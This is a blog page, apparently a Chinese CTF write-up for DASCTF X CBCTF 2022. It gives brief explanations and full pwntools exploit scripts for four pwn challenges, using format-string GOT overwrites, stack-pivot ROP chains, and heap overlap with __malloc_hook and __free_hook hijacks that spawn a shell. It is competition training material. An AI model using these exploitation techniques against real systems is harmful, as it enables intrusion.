@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Hexo">
+  <link 
+    rel="icon" 
+    href="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg">
+  <title>DASCTF_X_CBCTF_2022九月挑战赛</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="DASCTF_X_CBCTF_2022九月挑战赛">
+    
+    
+      <meta 
+        property="og:url" 
+        content="http://example.com/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2022-09-20">
+      <meta 
+        property="og:article:modified_time" 
+        content="2022-09-20">
+      <meta 
+        property="og:article:author" 
+        content="幽林">
+      
+        
+      
+    
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  <link rel="preload" href="/css/main.css" as="style" >
+  
+  <link rel="modulepreload" href="//instant.page/5.1.0">
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+  
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <a class="navbar-logo-main" href="/">
+      
+        <img 
+          class="navbar-logo-img"
+          width="32"
+          height="32"
+          src="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">幽林</span>
+      </a>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          Home
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          Archive
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          Tags
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          Categories
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          About
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          Friends
+        
+      </a>
+    
+    <button 
+      class="navbar-menu-item darknavbar navbar-menu-btn" 
+      aria-label="Toggle dark mode"
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </button>
+    <button 
+      class="navbar-menu-item searchnavbar navbar-menu-btn" 
+      aria-label="Toggle search"
+      id="search">
+      <!-- <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i> -->
+      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img"
+        class="iconify iconify--ion" width="28" height="28" preserveAspectRatio="xMidYMid meet" viewBox="0 0 512 512">
+        <path fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="28"
+          d="M256 80a176 176 0 1 0 176 176A176 176 0 0 0 256 80Z"></path>
+        <path fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="28"
+          d="M232 160a72 72 0 1 0 72 72a72 72 0 0 0-72-72Z"></path>
+        <path fill="none" stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="28"
+          d="M283.64 283.64L336 336"></path>
+      </svg>
+    </button>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg" 
+    class="author-img"
+    width="88"
+    height="88"
+    alt="author avatar">
+
+<p class="author-name">幽林</p>
+<p class="author-description">太菜了，只能输出点垃圾</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>18</span>
+    <span>Posts</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>0</span>
+    <span>Categories</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>0</span>
+    <span>Tags</span>
+  </a>
+</div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#cyberprinter"><span class="toc-text">cyberprinter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#appetizer"><span class="toc-text">appetizer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bar"><span class="toc-text">bar</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-note"><span class="toc-text">ez_note</span></a>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>Categories
+  </div>
+  <div class="categories-list">
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>hot tags
+  </div>
+  <div class="tags-list">
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <main class="main-column">
+              
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      DASCTF_X_CBCTF_2022九月挑战赛
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2022-09-20T08:27:39.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2022-09-20</span>
+    </time>
+    
+    
+      <span class="dot"></span>
+      <span>1.6k words</span>
+    
+  </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h2 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h2><p>首先通过溢出覆盖’’\x00’，可以泄露libc.然后是一个格式化字符串漏洞修改puts里面的strlen的libc got</p>
+<pre class="highlight"><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./cyberprinter&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">onegadget=0xe6aee</span><br><span class="line">ru(&quot;Your name?pls..&quot;)</span><br><span class="line">sl(b&#x27;A&#x27;*0x17)</span><br><span class="line">libcbase=uu64()-0x1edc50</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">onegadget=libcbase+onegadget</span><br><span class="line">abs_got=libcbase+0x1eb0a8</span><br><span class="line">payload=fmtstr_payload(8,&#123;abs_got:onegadget&#125;)</span><br><span class="line">ru(b&quot;But there is sth wrong in it,so you can&#x27;t do sth&quot;)</span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre>
+
+<h2 id="appetizer"><a href="#appetizer" class="headerlink" title="appetizer"></a>appetizer</h2><p>首先是一个检查，结合ida和调试可以发现是Nameless和两个字节的偏移，所以是发送’AANameless’来跳过check</p>
+<p>之后就是一个很明显的栈迁移，但是注意不能离end开头太近，函数栈帧会因为往end里写数据而被破坏导致崩溃，所以可以使用垃圾数据把函数栈帧往下挪，使其远离end开头</p>
+<pre class="highlight"><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./appetizer&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(14),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(&quot;Let&#x27;s check your identity&quot;)</span><br><span class="line">#sl(b&quot;sselemaN&quot;)</span><br><span class="line">s(b&#x27;AANameless&#x27;)</span><br><span class="line">#sl(b&#x27;A&#x27;*2+p64(0x7373656c656d614e))</span><br><span class="line">io.recvuntil(&quot;Here you are:&quot;)</span><br><span class="line">gift=iuu64()</span><br><span class="line">print(&quot;gift:&quot;+hex(gift))</span><br><span class="line">base=gift-0x4050</span><br><span class="line">leave_ret=0x00000000000012d8+base</span><br><span class="line">pop_rdi=base+0x00000000000014d3</span><br><span class="line">pop_rsi_r15=0x00000000000014d1+base</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]+base</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]+base</span><br><span class="line">read_plt=elf.plt[&#x27;read&#x27;]+base</span><br><span class="line">main=0x1428+base</span><br><span class="line"></span><br><span class="line">payload=b&#x27;\x00&#x27;*0x60+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">ru(&quot;And pls write your own information on it&quot;)</span><br><span class="line">s(payload)</span><br><span class="line">ru(&quot;Tell me your wish:&quot;)</span><br><span class="line">payload=p64(gift+0x60-8)+p64(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">gdb.attach(io,&#x27;b *gift&#x27;)</span><br><span class="line">libcbase=uu64()-libc.sym[&#x27;puts&#x27;]</span><br><span class="line">open_addr=libcbase+libc.sym[&#x27;open&#x27;]</span><br><span class="line">pop_rsi = libcbase + 0x27529</span><br><span class="line">pop_rdx_rbx = libcbase + 0x1626d6</span><br><span class="line">write_addr=libcbase+libc.sym[&#x27;write&#x27;]</span><br><span class="line">read_addr=libcbase+libc.sym[&#x27;read&#x27;]</span><br><span class="line">puts_addr=libcbase+libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">orw=b&#x27;./flag&#x27;.ljust(8,b&#x27;\x00&#x27;)+ b&#x27;\x00&#x27; * 0x70 + p64(pop_rdi) + p64(gift) + p64(pop_rsi) + p64(0) + p64(open_addr)</span><br><span class="line">orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(gift + 8) + p64(pop_rdx_rbx) + p64(0x30) + p64(0) + p64(read_plt)</span><br><span class="line">orw+=p64(pop_rdi)+p64(1)+p64(write_addr)</span><br><span class="line"></span><br><span class="line">s(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre>
+
+<h1 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h1><p>一道比较简单的堆题，首先3选项可以直接泄露出libc，而且uaf,堆溢出都有</p>
+<p>首先泄露出libc，接着利用堆溢出构造出unsorted bin，使得堆块重叠，任意修改tcache的fd指针打malloc_hook</p>
+<pre class="highlight"><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./bar&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(15),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla(&quot;Your choice:&quot;,str(choice))</span><br><span class="line"></span><br><span class="line">def add(choice,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla(&quot;Whisky , brandy or Vodka?&quot;,str(choice))</span><br><span class="line">    sla(&quot;You may want to tell sth to the waiter:&quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(idx, size):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(b&#x27;Which?&#x27;, str(idx))</span><br><span class="line">    sla(b&#x27;How much?&#x27;, str(size))</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">    cmd(3)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">ru(&quot;We will give everyone only one cup of icecream!&quot;)</span><br><span class="line">libcbase=iuu64()-0x1ec6a0</span><br><span class="line">onegadget=libcbase+0xe6af1</span><br><span class="line">malloc_hook=libcbase+libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">lg=(&#x27;libcbase&#x27;)</span><br><span class="line"></span><br><span class="line">add(0,b&#x27;youlin&#x27;)#0</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#1</span><br><span class="line">add(2,b&#x27;youlin&#x27;)#2</span><br><span class="line">add(2,b&#x27;youlin&#x27;)#3</span><br><span class="line">add(2,b&#x27;youlin&#x27;)#4</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#5</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#6</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#7</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#8</span><br><span class="line"></span><br><span class="line">delete(3,0x40)</span><br><span class="line">delete(2,0x40)</span><br><span class="line">delete(0,0x100)</span><br><span class="line">add(0,b&#x27;A&#x27;*0xf8+p64(0x421))</span><br><span class="line">delete(1,0x100)</span><br><span class="line"></span><br><span class="line">add(1,b&#x27;youlin&#x27;)</span><br><span class="line">add(0,b&#x27;A&#x27;*0x98+p64(0x51)+p64(malloc_hook-0x10))</span><br><span class="line"></span><br><span class="line">add(2,b&#x27;youlin&#x27;)</span><br><span class="line">add(2,p64(onegadget))</span><br><span class="line"></span><br><span class="line">add(1,b&#x27;youlin&#x27;)</span><br><span class="line">ia()</span><br></pre>
+
+<h1 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h1><p>整数溢出造成的堆溢出，利用溢出修改出unsorted的size大小，造成堆重叠</p>
+<pre class="highlight"><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./pwn&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 29013</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla(&quot;Your choice:&quot;,str(choice))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sa(&quot;Note size:&quot;,str(size))</span><br><span class="line">    sa(&quot;Note content:&quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sa(&quot;Note ID:&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sa(&quot;Note ID:&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    cmd(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#0</span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#1</span><br><span class="line">add(0x200,b&#x27;youlin&#x27;)#2</span><br><span class="line">add(0x200,b&#x27;youlin&#x27;)#3</span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#4</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">payload=b&#x27;A&#x27;*0x80+p64(0)+p64(0x4B1)</span><br><span class="line">add(0x100000080,payload)# 整数溢出 0</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#1</span><br><span class="line">show(2)</span><br><span class="line">ru(&#x27;Note content:&#x27;)</span><br><span class="line">libcbase=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x1ebbe0</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line"></span><br><span class="line">add(0x400,b&#x27;youiln&#x27;)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload=b&#x27;A&#x27;*0x80+p64(0)+p64(0x211)</span><br><span class="line">add(0x100000080,payload) # 1</span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload=b&#x27;A&#x27;*0x80+p64(0)+p64(0x211)+p64(free_hook)</span><br><span class="line">add(0x100000080,payload)    # 1</span><br><span class="line"></span><br><span class="line">add(0x200,b&#x27;/bin/sh\x00&#x27;)    # 2</span><br><span class="line">add(0x200,p64(system)) # 3</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre>
+
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            幽林
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="http://example.com/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/">
+            http://example.com/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/2022/09/14/house-of-cat/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">Next</div>
+          
+            <div class="nav-title">house_of_cat </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#cyberprinter"><span class="toc-text">cyberprinter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#appetizer"><span class="toc-text">appetizer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bar"><span class="toc-text">bar</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-note"><span class="toc-text">ez_note</span></a>
+</div>
+            </main>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#cyberprinter"><span class="toc-text">cyberprinter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#appetizer"><span class="toc-text">appetizer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bar"><span class="toc-text">bar</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-note"><span class="toc-text">ez_note</span></a>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>Recent Posts
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-09-20</div>
+        <a href="/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"><div class="recent-posts-item-content">DASCTF_X_CBCTF_2022九月挑战赛</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-09-14</div>
+        <a href="/2022/09/14/house-of-cat/"><div class="recent-posts-item-content">house_of_cat</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-09-12</div>
+        <a href="/2022/09/12/%E5%91%A8%E6%8A%A5%E6%A8%A1%E6%9D%BF/"><div class="recent-posts-item-content">周报模板</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-09-07</div>
